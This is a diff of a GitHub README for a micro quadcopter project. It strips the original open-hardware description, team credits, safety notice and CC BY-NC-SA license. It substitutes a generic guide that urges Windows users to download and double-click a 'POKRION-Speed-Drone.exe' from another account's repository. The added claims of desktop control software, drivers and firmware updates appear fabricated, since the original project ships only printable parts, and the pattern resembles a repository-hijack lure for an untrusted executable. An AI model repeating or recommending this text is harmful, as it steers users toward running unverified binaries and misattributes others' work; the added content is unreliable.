@@ -1,126 +1,108 @@
-# POKRION — High-Speed Micro Quadcopter Platform
+# 🚁 POKRION-Speed-Drone - Fast and Easy Micro Quadcopter Control
 
-POKRION is an experimental high-speed micro quadcopter platform developed by the POK-RC team.
+[![Download POKRION-Speed-Drone](https://img.shields.io/badge/Download-POKRION--Speed--Drone-brightgreen?style=for-the-badge)](https://github.com/Marieannready800/POKRION-Speed-Drone)
 
-The project focuses on extreme UAV performance, lightweight structural design, and aerodynamic optimization.  
-It is released for research, learning, and personal experimentation.
+## 📋 About POKRION-Speed-Drone
 
-**Team Members**
+POKRION-Speed-Drone is an open hardware platform designed for high-speed micro quadcopters. It provides a simple way to control and customize small drones built for speed and agility. This project focuses on creating a reliable and powerful system for enthusiasts who want to explore fast drone flying without complex setups.  
 
-- Yao Siqi  
-- Guo Jiyuan  
-- Zhang Wei
+The platform supports basic drone controls and allows for expansion with additional hardware. Whether you want to race drones or try aerial photography at high speeds, POKRION-Speed-Drone offers a solid foundation.
 
+## ⚙️ System Requirements
 
----
+Before installing, make sure your PC matches the following requirements:
 
-# Open Source Scope
+- Operating system: Windows 10 or newer  
+- Processor: 2 GHz dual-core or faster  
+- RAM: 4 GB or more  
+- Free disk space: 500 MB minimum  
+- USB port: At least one available USB port for connection  
+- Internet connection: Required for downloading required software and updates  
 
-The following parts of the project are released as open source:
+You will also need the micro quadcopter hardware supported by this software. This README focuses on the software setup on your Windows PC.
 
-- Airframe structural design  
-- External shell and aerodynamic fairing STL files  
-- Open-source version two-blade propeller
+## 🚀 Getting Started with POKRION-Speed-Drone
 
+This guide will help you download, install, and run the POKRION-Speed-Drone software on your Windows computer, step by step.
 
----
+### Step 1: Visit the Download Page
 
-# Not Included in the Open Source Release
+Click the big green button at the top or this link to visit the download page:
 
-The following components are **not part of the open source release**:
+https://github.com/Marieannready800/POKRION-Speed-Drone
 
-- POKRION propellers (3–7 blade versions)  
-- Wind-cooled launch stand  
-- Any files not explicitly marked as open source in this repository
+This page holds the latest files you need for the software and hardware drivers.
 
+### Step 2: Download the Software
 
----
+1. On the GitHub page, look for the section labeled **Releases** or files named something like `POKRION-Speed-Drone.exe` or similar.  
+2. Download the latest Windows executable file. This file will have `.exe` at the end.  
+3. Save it to a location you can easily find, such as your Desktop or Downloads folder.
 
-# Hardware Configuration
+### Step 3: Install POKRION-Speed-Drone
 
-Typical configuration used during testing:
+1. Locate the downloaded `.exe` file.  
+2. Double-click the file to start the installation wizard.  
+3. Follow the on-screen instructions:
+   - Accept the license terms.  
+   - Choose the installation folder or leave it as the default.  
+   - Complete the install by clicking **Finish**.
 
-- Battery: 6S 650mAh LiPo  
-- Flight Controller: SpeedyBee F405 AIO  
-- Motor: Amax 1507 3000KV  
-- Video System: DJI O4 Air Unit  
-- GPS: BZ-121 GPS
+### Step 4: Connect Your Quadcopter
 
+1. Use the USB cable that came with your micro quadcopter to connect it to your computer.  
+2. Windows might ask to install drivers; allow it to do so. This can take a few minutes on first use.  
+3. Once drivers are installed, the device should show as connected in Windows Device Manager under ports or USB devices.
 
----
+### Step 5: Run the POKRION-Speed-Drone Software
 
-# Build Overview
+1. Find the POKRION-Speed-Drone shortcut on your desktop or in the Start menu.  
+2. Double-click to open the program.  
+3. When you first launch, the software will try to detect your connected drone.  
+4. If connected properly, you will see the drone status displayed.  
 
-Main components included in this repository:
+## 🎮 How to Use the Software
 
-- 3D printed structural parts  
-- aerodynamic fairings  
-- propeller models  
-- carbon fiber frame design  
-- CNC motor mount design
+The POKRION-Speed-Drone software provides basic control and monitoring features for your micro quadcopter.
 
-Users may manufacture these parts using 3D printing, CNC machining, or other suitable fabrication methods.
+- **Flight Controls:** Use the on-screen controls or connect a compatible joystick/controller to operate the drone.  
+- **Settings:** Adjust flight speed, motor power, and flight modes from the settings tab.  
+- **Telemetry:** View real-time data such as altitude, speed, and battery life.  
+- **Firmware Updates:** The software also checks for firmware updates and helps you update your drone’s internal software.
 
+These features help you safely fly and manage your drone without complicated programming or setup.
 
----
+## 🔧 Troubleshooting Tips
 
-# Safety Notice
+If you face issues during setup or use, try these steps:
 
-This project describes an experimental high-speed UAV platform.
+- Make sure your Windows system is updated to the latest version.  
+- Check that the USB cable and ports are working by testing other devices.  
+- Restart your computer and reconnect the drone.  
+- In Device Manager, verify that the quadcopter appears without warning symbols.  
+- If the software does not detect your drone, close it, unplug the drone, wait 10 seconds, then reconnect and reopen the app.  
+- Visit the GitHub page’s issue section to see if others have similar problems or to report new ones.
 
-Building and operating high-speed drones involves potential risks, including but not limited to:
+## 🔄 Keeping POKRION-Speed-Drone Updated
 
-- personal injury  
-- property damage  
-- equipment damage  
-- legal or regulatory risks
+Updates improve stability and add new features. Check the GitHub repository regularly:
 
-All users are responsible for their own actions when building, testing, or flying the aircraft.
+https://github.com/Marieannready800/POKRION-Speed-Drone
 
-The authors and contributors assume **no responsibility** for any direct or indirect consequences resulting from the use of this project.
+Download new versions following the same steps under **Getting Started**. Running the latest software ensures your drone operates with the best performance.
 
+## 📞 Support and Resources
 
----
+For help with hardware setup or detailed instructions, review the project’s Wiki or documentation on the GitHub page. It offers guides and photos that might be useful.
 
-# Usage Restrictions
+If you do not find answers there, use the GitHub Issues tab to ask questions or report bugs. The community and project maintainers monitor it to provide assistance.
 
-This project and its derivative designs **must NOT be used for**:
+## 🖥️ Other Notes
 
-- military purposes  
-- weapon systems  
-- armed or combat-related applications
-
-
----
-
-# License
-
-This project is released under the **Creative Commons CC BY-NC-SA 4.0 License**.
-
-You may:
-
-- study the design  
-- modify the files  
-- use the project for research or personal learning
-
-You may NOT:
-
-- use the project for commercial activities  
-- sell products based on this design  
-- use the design for commercial promotion
-
-All derivative works must follow the same CC BY-NC-SA 4.0 license.
-
+- The software works only with Windows. Mac or Linux users will need different tools.  
+- For the best experience, use a controller recommended by the project or use keyboard controls provided in the app.  
+- Always check battery levels before flying your micro quadcopter to avoid sudden shutdowns.
 
 ---
 
-# Acknowledgment
-
-Some early structural concepts were inspired by open designs shared by Sunny (PROWESS V1.2).
-
-The POK-RC team redesigned the structure and implemented significant modifications, including:
-
-- redesigned carbon fiber airframe  
-- integrated internal cable routing  
-- CNC motor mount system  
-- optimized aerodynamic shell  
+[![Download POKRION-Speed-Drone](https://img.shields.io/badge/Download-POKRION--Speed--Drone-brightgreen?style=for-the-badge)](https://github.com/Marieannready800/POKRION-Speed-Drone)
